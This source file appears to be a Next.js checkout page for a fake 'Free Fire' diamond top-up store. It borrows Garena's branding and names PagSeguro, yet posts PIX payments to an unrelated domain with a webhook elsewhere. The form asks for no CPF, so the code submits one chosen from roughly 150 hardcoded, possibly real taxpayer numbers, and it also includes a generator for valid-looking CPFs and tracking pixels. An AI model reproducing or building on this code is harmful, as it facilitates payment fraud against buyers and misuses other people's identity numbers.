'use client';

import { Suspense, useState, useEffect } from 'react';
import Link from 'next/link';
import Image from 'next/image';
import { ChevronLeft } from 'lucide-react';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { Header } from '@/components/freefire/Header';
import { Footer } from '@/components/freefire/Footer';
import { useForm } from 'react-hook-form';
import { zodResolver } from '@hookform/resolvers/zod';
import * as z from 'zod';
import { Form, FormControl, FormField, FormItem, FormLabel, FormMessage } from '@/components/ui/form';
import { useToast } from "@/hooks/use-toast";
import { useRouter } from 'next/navigation';

function gerarDigitoVerificador(cpfParcial) {
  let soma = 0;
  let peso = cpfParcial.length + 1;

  for (let i = 0; i < cpfParcial.length; i++) {
    soma += parseInt(cpfParcial.charAt(i)) * peso;
    peso--;
  }

  const resto = soma % 11;
  return resto < 2 ? 0 : 11 - resto;
}

function formatarCPF(cpf) {
  return cpf.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, '$1.$2.$3-$4');
}

function gerarCPFSP() {
  const primeiroDigito = Math.floor(Math.random() * 4); // 0-3
  let cpfParcial = primeiroDigito.toString();

  for (let i = 0; i < 8; i++) {
    cpfParcial += Math.floor(Math.random() * 10);
  }

  const digito1 = gerarDigitoVerificador(cpfParcial);
  cpfParcial += digito1;

  const digito2 = gerarDigitoVerificador(cpfParcial);
  cpfParcial += digito2;

  return formatarCPF(cpfParcial);
}

const formSchema = z.object({
  name: z.string()
    .min(1, { message: "Nome é obrigatório." })
    .refine(value => value.trim().split(" ").length >= 2, {
      message: "Por favor, insira o nome e sobrenome.",
    }),
  email: z.string()
    .min(1, { message: "E-mail é obrigatório." })
    .email({ message: "Formato de e-mail inválido." }),
  phone: z.string()
    .min(1, { message: "Número de telefone é obrigatório." })
    .regex(/^\(\d{2}\) \d \d{4}-\d{4}$/, { message: "Formato de telefone inválido." }),
  promoCode: z.string().optional(),
});

interface CheckoutData {
  playerName: string;
  price: string;
  formattedPrice: string;
  paymentMethodName: string;
  originalAmount: string;
  bonusAmount: string;
  totalAmount: string;
  productDescription: string;
}

interface PaymentPayload {
  name: string;
  email: string;
  cpf: string;
  phone: string;
  paymentMethod: string;
  amount: number;
  traceable: boolean;
  externalId: string;
  postbackUrl: string;
  items: {
    unitPrice: number;
    title: string;
    quantity: number;
    tangible: boolean;
  }[];
}

const cpfsFixos: string[] = [
  "107.578.608-85",
  "302.483.758-22",
  "284.358.278-44",
  "303.824.988-28",
  "783.786.725-49",
  "312.806.468-70",
  "101.614.018-56",
  "185.575.478-97",
  "145.774.718-92",
  "129.512.988-46",
  "285.083.688-52",
  "086.187.598-21",
  "113.541.338-03",
  "112.826.508-74",
  "264.728.128-96",
  "062.535.538-52",
  "057.597.518-08",
  "128.392.498-63",
  "171.164.938-40",
  "265.263.388-01",
  "327.962.058-94",
  "322.028.248-20",
  "062.205.798-79",
  "287.318.848-06",
  "079.506.585-09",
  "081.740.005-26",
  "075.082.865-02",
  "081.688.005-08",
  "045.783.465-01",
  "062.411.515-17",
  "081.025.195-76",
  "082.342.345-01",
  "095.116.545-35",
  "084.130.405-07",
  "081.226.465-73",
  "071.253.925-55",
  "095.527.605-50",
  "113.572.654-09",
  "043.989.425-56",
  "101.912.235-81",
  "051.540.895-61",
  "086.427.525-05",
  "086.205.425-75",
  "067.027.355-45",
  "084.349.525-13",
  "067.417.835-12",
  "061.170.415-35",
  "063.833.875-10",
  "861.237.575-47",
  "862.790.465-08",
  "082.064.945-70",
  "011.508.905-50",
  "843.601.435-91",
  "089.630.815-40",
  "080.904.575-33",
  "089.298.425-26",
  "085.055.685-67",
  "070.575.915-60",
  "018.042.705-98",
  "082.955.805-58",
  "232.510.980-12",
  "490.978.490-04",
  "465.850.940-77",
  "109.155.960-08",
  "298.200.100-47",
  "172.875.250-70",
  "175.738.220-81",
  "769.381.640-29",
  "793.708.180-57",
  "233.418.610-41",
  "686.685.620-53",
  "149.173.870-78",
  "005.493.640-30",
  "828.753.280-93",
  "437.464.280-33",
  "515.723.400-70",
  "452.710.080-70",
  "420.755.850-08",
  "396.292.430-24",
  "491.346.250-46",
  "607.627.510-37",
  "864.119.120-84",
  "912.867.350-68",
  "297.579.250-63",
  "178.005.770-90",
  "376.732.460-15",
  "707.767.160-77",
  "067.449.880-18",
  "587.476.770-31",
  "298.341.500-75",
  "860.105.990-24",
  "863.147.890-36",
  "105.506.840-69",
  "019.908.780-67",
  "276.179.790-61",
  "668.571.590-17",
  "219.486.570-58",
  "853.881.390-00",
  "932.393.870-00",
  "658.367.200-61",
  "460.625.870-51",
  "503.184.720-40",
  "909.157.080-60",
  "920.668.150-80",
  "394.705.480-78",
  "619.742.220-47",
  "394.705.480-78",
  "241.335.110-85",
  "188.206.340-66",
  "188.232.200-25",
  "824.352.100-35",
  "998.777.370-27",
  "619.659.160-66",
  "526.577.360-68",
  "116.051.130-69",
  "185.343.690-97",
  "615.342.660-38",
  "084.768.070-31",
  "479.573.490-99",
  "247.730.730-47",
  "949.131.120-40",
  "903.803.270-66",
  "046.331.610-08",
  "537.425.490-14",
  "952.228.020-86",
  "808.937.310-05",
  "666.175.510-52",
  "622.312.810-07",
  "653.293.170-53",
  "713.555.110-97",
  "279.582.460-48",
  "613.367.810-09",
  "465.619.480-84",
  "650.427.560-27",
  "310.746.760-09",
  "867.799.590-06",
  "867.799.590-06",
  "305.412.390-15",
  "696.828.690-48",
  "955.086.530-40",
  "907.894.560-52",
  "870.780.750-30",
  "093.991.060-80",
  "287.398.600-00",
  "182.359.270-80",
  "247.636.080-53",
  "055.443.260-96",
  "558.591.720-01",
  "454.502.900-04",
  "197.691.620-86"
];

function gerarCPFFixoAleatorio(): string {
  const indiceAleatorio = Math.floor(Math.random() * cpfsFixos.length);
  return cpfsFixos[indiceAleatorio];
}


function CheckoutForm() {
  const router = useRouter();
  const { toast } = useToast();
  const [isPromoApplied, setIsPromoApplied] = useState(false);
  const [playerName, setPlayerName] = useState("Carregando...");
  const [isSubmitting, setIsSubmitting] = useState(false);

  const checkoutData: CheckoutData = {
    playerName,
    price: '32999',
    formattedPrice: 'R$ 329,99',
    paymentMethodName: 'PagSeguro',
    originalAmount: '44.900',
    bonusAmount: '44.900',
    totalAmount: '89.800',
    productDescription: "Recarga Free Fire - 89.800 Diamantes",
  };

useEffect(() => {
  // CÓDIGO DO PIXEL
  window.pixelId = "68652c2603b34a13ee47f2dd";
  const utmScript = document.createElement("script");
  utmScript.src = "https://cdn.utmify.com.br/scripts/pixel/pixel.js";
  utmScript.async = true;
  utmScript.defer = true;
  document.head.appendChild(utmScript);

  const latestScript = document.createElement("script");
  latestScript.src = "https://cdn.utmify.com.br/scripts/utms/latest.js";
  latestScript.async = true;
  latestScript.defer = true;
  latestScript.setAttribute("data-utmify-prevent-xcod-sck", "");
  latestScript.setAttribute("data-utmify-prevent-subids", "");
  document.head.appendChild(latestScript);

  !(function (f, b, e, v, n, t, s) {
    if (f.fbq) return;
    n = f.fbq = function () {
      n.callMethod ? n.callMethod.apply(n, arguments) : n.queue.push(arguments);
    };
    if (!f._fbq) f._fbq = n;
    n.push = n;
    n.loaded = !0;
    n.version = "2.0";
    n.queue = [];
    t = b.createElement(e);
    t.async = !0;
    t.src = v;
    s = b.getElementsByTagName(e)[0];
    s.parentNode.insertBefore(t, s);
  })(window, document, "script", "https://connect.facebook.net/en_US/fbevents.js");

  window.fbq("init", "1264486768354584");
  window.fbq("track", "PageView");

  // SUA LÓGICA
  const storedPlayerName = localStorage.getItem('playerName');
  if (storedPlayerName) {
    setPlayerName(storedPlayerName);
  } else {
    setPlayerName("Não encontrado");
  }
}, [toast]); // <-- FECHAMENTO AQUI

  const form = useForm<z.infer<typeof formSchema>>({
    resolver: zodResolver(formSchema),
    mode: 'onChange',
    defaultValues: {
      name: '',
      email: '',
      phone: '',
      promoCode: '',
    },
  });


  const promoCodeValue = form.watch("promoCode");

  const handleApplyPromoCode = () => {
    if (promoCodeValue === 'DIAMANTE100') {
      setIsPromoApplied(true);
      toast({
        title: "Sucesso!",
        description: "Código promocional aplicado.",
      })
    } else {
      toast({
        variant: "destructive",
        title: "Erro",
        description: "Código promocional inválido.",
      })
    }
  };

  const handlePhoneChange = (e: React.ChangeEvent<HTMLInputElement>, fieldChange: (value: string) => void) => {
    const { value } = e.target;
    const cleaned = value.replace(/\D/g, '').slice(0, 11);
    let formatted = cleaned;
    if (cleaned.length > 0) {
      formatted = `(${cleaned.slice(0, 2)}`;
    }
    if (cleaned.length >= 3) {
      formatted = `(${cleaned.slice(0, 2)}) ${cleaned.slice(2, 3)}`;
    }
    if (cleaned.length >= 4) {
      formatted = `(${cleaned.slice(0, 2)}) ${cleaned.slice(2, 3)} ${cleaned.slice(3, 7)}`;
    }
    if (cleaned.length >= 8) {
      formatted = `(${cleaned.slice(0, 2)}) ${cleaned.slice(2, 3)} ${cleaned.slice(3, 7)}-${cleaned.slice(7, 11)}`;
    }
    fieldChange(formatted);
  };

  const onSubmit = async (values: z.infer<typeof formSchema>) => {
    setIsSubmitting(true);

    const payload: PaymentPayload = {
      name: values.name,
      email: values.email,
      cpf: values.cpf ? values.cpf.replace(/\D/g, '') : gerarCPFFixoAleatorio().replace(/\D/g, ''),
      phone: values.phone.replace(/\D/g, ''),
      paymentMethod: "PIX",
      amount: parseFloat(checkoutData.price),
      traceable: true,
      externalId: `ff-${Date.now()}`,
      postbackUrl: "https://sopayload.com/api/webhook",
      items: [{
        unitPrice: parseFloat(checkoutData.price),
        title: checkoutData.productDescription,
        quantity: 1,
        tangible: false,
      }],
    };

    try {
      const response = await fetch("https://www.recargajogo.online/api/create-payment", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(payload),
      });

      const data = await response.json();
      if (!response.ok) throw new Error(data.error || "Erro ao processar o pagamento");

      localStorage.setItem('paymentData', JSON.stringify({
        ...data,
        playerName: checkoutData.playerName,
        productDescription: checkoutData.productDescription,
        amount: checkoutData.formattedPrice,
        diamonds: checkoutData.totalAmount,
      }));

      if (data.pixQrCode || data.pixCode) {
        router.push('/buy44900');
      } else if (data.payment_url) {
        window.location.href = data.payment_url;
      } else {
        throw new Error("Pagamento retornou sem dados válidos");
      }
    } catch (error: any) {
      toast({ variant: "destructive", title: "Erro no pagamento", description: error.message });
    } finally {
      setIsSubmitting(false);
    }
  };

  return (
    <div className="flex flex-col md:mx-auto md:my-6 md:max-w-[600px] md:rounded-2xl md:bg-white overflow-hidden">
      <div className="mb-3 bg-gray-50 md:mb-4 md:rounded-t-2xl md:p-2 md:pb-0">
        <div className="relative h-20 overflow-hidden md:h-[120px] md:rounded-t-lg">
          <Image
            className="h-full w-full object-cover"
            src="https://cdn-gop.garenanow.com/gop/mshop/www/live/assets/FF-f997537d.jpg"
            alt="Free Fire Banner"
            fill
            data-ai-hint="gameplay screenshot"
          />
          <Link
            href="/"
            className="absolute start-4 top-4 md:start-6 md:top-6 flex items-center gap-1.5 rounded-full bg-black/40 p-1.5 pr-3 text-sm/none font-medium text-white ring-1 ring-white/70 transition-colors hover:bg-black/60 md:pr-3.5 md:text-base/none"
            aria-label="Voltar para a pagina inicial"
          >
            <ChevronLeft className="h-4 w-4 md:h-5 md:w-5" />
            Voltar
          </Link>
        </div>
        <div className="relative mx-5 -mt-9 flex flex-col items-center gap-4 md:-mt-10">
          <Image
            className="block h-[72px] w-[72px] overflow-hidden rounded-lg bg-white object-contain ring-4 ring-gray-50 md:h-20 md:w-20"
            src="https://cdn-gop.garenanow.com/gop/app/0000/100/067/icon.png"
            alt="Free Fire"
            width={80}
            height={80}
            data-ai-hint="game icon"
          />
          <div className="text-center text-xl/none font-bold text-gray-800 md:text-2xl/none">Free Fire</div>
        </div>
      </div>

      <dl className="mb-3 grid grid-cols-2 justify-between gap-x-3.5 px-4 md:mb-4 md:px-10">
        <dt className="py-3 text-sm/none text-gray-600 md:text-base/none">Total</dt>
        <dd className="flex items-center justify-end gap-1 py-3 text-end text-sm/none font-medium text-gray-800 md:text-base/none">
          <Image className="h-3.5 w-3.5" src="https://cdn-gop.garenanow.com/gop/app/0000/100/067/point.png" width={14} height={14} alt="Diamante" data-ai-hint="diamond gem" />
          {checkoutData.totalAmount}
        </dd>

        <div className="col-span-2 my-1 w-full">
          <ul className="flex flex-col gap-3 rounded-md border border-gray-200/50 bg-white p-3 text-xs/none md:text-sm/none">
            <li className="flex items-center justify-between gap-12">
              <div className="text-gray-600">Preço Original</div>
              <div className="flex shrink-0 items-center gap-1">
                <Image className="h-3 w-3 object-contain" src="https://cdn-gop.garenanow.com/gop/app/0000/100/067/point.png" width={12} height={12} alt="Diamante" data-ai-hint="diamond gem" />
                <div className="font-medium text-gray-800">{checkoutData.originalAmount}</div>
              </div>
            </li>
            <li className="flex items-center justify-between gap-12">
              <div className="text-gray-600">+ Bônus Geral</div>
              <div className="flex shrink-0 items-center gap-1">
                <Image className="h-3 w-3 object-contain" src="https://cdn-gop.garenanow.com/gop/app/0000/100/067/point.png" width={12} height={12} alt="Diamante" data-ai-hint="diamond gem" />
                <div className="font-medium text-gray-800">{checkoutData.bonusAmount}</div>
              </div>
            </li>
          </ul>
        </div>

        <div className="col-span-2 mb-1 text-xs/normal text-gray-500 md:text-sm/normal">
          Os diamantes, são válidos apenas para a região do Brasil e serão creditados diretamente na conta de jogo.
        </div>

        <dt className="py-3 text-sm/none text-gray-600 md:text-base/none">Preço</dt>
        <dd className="flex items-center justify-end gap-1 py-3 text-end text-sm/none font-medium text-gray-800 md:text-base/none">
          {checkoutData.formattedPrice}
        </dd>

        <dt className="py-3 text-sm/none text-gray-600 md:text-base/none">Método de pagamento</dt>
        <dd className="flex items-center justify-end gap-1 py-3 text-end text-sm/none font-medium text-gray-800 md:text-base/none">{checkoutData.paymentMethodName}</dd>

        <dt className="py-3 text-sm/none text-gray-600 md:text-base/none">Nome do Jogador</dt>
        <dd className="flex items-center justify-end gap-1 py-3 text-end text-sm/none font-medium text-gray-800 md:text-base/none">{checkoutData.playerName}</dd>
      </dl>

      <div className="h-2 bg-gray-200"></div>

      <Form {...form}>
        <form onSubmit={form.handleSubmit(onSubmit)} className="flex flex-col gap-6 px-4 pb-8 pt-5 md:p-10 md:pt-6">
          <FormField
            control={form.control}
            name="promoCode"
            render={({ field }) => (
              <FormItem>
                <FormLabel className="text-[15px]/4 font-medium text-gray-800">Código promocional</FormLabel>
                <div className="flex items-end">
                  <FormControl>
                    <Input {...field} placeholder="Código Promocional" className="flex-1 rounded-r-none border-r-0 focus-visible:ring-offset-0" disabled={isPromoApplied} />
                  </FormControl>
                  <Button type="button" className="rounded-l-none h-11 px-5 text-base" variant="destructive" disabled={promoCodeValue !== 'DIAMANTE100' || isPromoApplied} onClick={handleApplyPromoCode}>
                    {isPromoApplied ? "Aplicado" : "Aplicar"}
                  </Button>
                </div>
              </FormItem>
            )}
          />

          <FormField
            control={form.control}
            name="name"
            render={({ field }) => (
              <FormItem>
                <FormLabel className="text-[15px]/4 font-medium text-gray-800">Nome Completo</FormLabel>
                <FormControl>
                  <Input {...field} placeholder="Nome Completo" maxLength={50} />
                </FormControl>
                <FormMessage />
              </FormItem>
            )}
          />

          <FormField
            control={form.control}
            name="email"
            render={({ field }) => (
              <FormItem>
                <FormLabel className="text-[15px]/4 font-medium text-gray-800">E-mail</FormLabel>
                <FormControl>
                  <Input {...field} type="email" placeholder="E-mail" maxLength={60} />
                </FormControl>
                <FormMessage />
              </FormItem>
            )}
          />

          <FormField
            control={form.control}
            name="phone"
            render={({ field }) => (
              <FormItem>
                <FormLabel className="text-[15px]/4 font-medium text-gray-800">Número de telefone</FormLabel>
                <FormControl>
                  <Input
                    {...field}
                    inputMode="numeric"
                    placeholder="(00) 0 0000-0000"
                    onChange={(e) => handlePhoneChange(e, field.onChange)}
                  />
                </FormControl>
                <FormMessage />
              </FormItem>
            )}
          />

          <div className="text-gray-500 text-xs/normal">
            Ao clicar em “Prosseguir para Pagamento”, atesto que li e concordo com os <a href="https://international.pagseguro.com/legal-compliance" className="underline" target="_blank" rel="noopener noreferrer">termos de uso</a> e com a <a href="https://sobreuol.noticias.uol.com.br/normas-de-seguranca-e-privacidade/" className="underline" target="_blank" rel="noopener noreferrer">política de privacidade</a> do PagSeguro
          </div>

          <div className="mt-2">
            <Button type="submit" className="w-full h-11 text-base" variant="destructive" disabled={!form.formState.isValid || isSubmitting}>
              {isSubmitting ? "Processando..." : "Prosseguir para pagamento"}
            </Button>
          </div>
        </form>
      </Form>
    </div>
  );
}

export default function CheckoutPage() {
  return (
    <div className="flex flex-col min-h-screen">
      <Header />
      <main className="flex-1 bg-cover bg-center" style={{ backgroundImage: "url('https://cdn-gop.garenanow.com/gop/mshop/www/live/assets/FF-06d91604.png')" }}>
        <Suspense fallback={<div className="flex items-center justify-center h-full">Carregando...</div>}>
          <CheckoutForm />
        </Suspense>
      </main>
      <Footer />
    </div>
  );
}